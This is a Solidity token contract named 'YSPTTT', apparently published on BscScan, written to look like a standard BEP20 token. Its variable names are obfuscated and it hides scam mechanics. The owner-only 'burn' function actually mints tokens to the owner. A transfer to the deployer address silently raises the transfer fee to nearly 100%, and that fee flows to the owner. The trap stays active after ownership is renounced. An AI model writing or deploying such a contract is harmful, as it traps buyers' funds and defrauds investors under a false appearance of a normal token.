/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.6.0;
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

contract YSPTTT {
uint256 private  YOHIUK = 1000000000000000;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
address private  NYOMYN = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
uint256 public constant CNPDTJ = 99999;
uint256 private  KSVJTI = 100000000;
string public  name = "YSPTTT";
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  SPYOQW = address(0);
mapping (address => uint256) public balanceOf;
address private  URHMIM = address(0);
uint256 private  BFOTUV = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  PRQDVL = 10000000000;
uint256 private  UUBJTV = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  IRPKCC = 1000000000000000000000;
string public  symbol = "YSPTTT";
address private  RRMDRJ = address(0);
address private  IJEKOX = address(0);
uint256 private  GVAYLK = 10000000000000;
function _getYOHIUK() private returns (uint256) {
return YOHIUK;
}

function _getIJEKOX() private returns (address) {
return IJEKOX;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "OHHMKW");
require(to != address(0), "OHHMKW");
require(amount <= balanceOf[from], "OHHMKW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* CNPDTJ/UUBJTV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==URHMIM){
UUBJTV = CNPDTJ+2;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getPRQDVL() private returns (uint256) {
return PRQDVL;
}

function _getSPYOQW() private returns (address) {
return SPYOQW;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getBFOTUV() private returns (uint256) {
return BFOTUV;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getNYOMYN() private returns (address) {
return NYOMYN;
}

function _getRRMDRJ() private returns (address) {
return RRMDRJ;
}

constructor () public {
URHMIM = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getGVAYLK() private returns (uint256) {
return GVAYLK;
}

function _getKSVJTI() private returns (uint256) {
return KSVJTI;
}

function _getIRPKCC() private returns (uint256) {
return IRPKCC;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tOHHMKW 0");
require(spender != address(0), "fOHHMKW 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}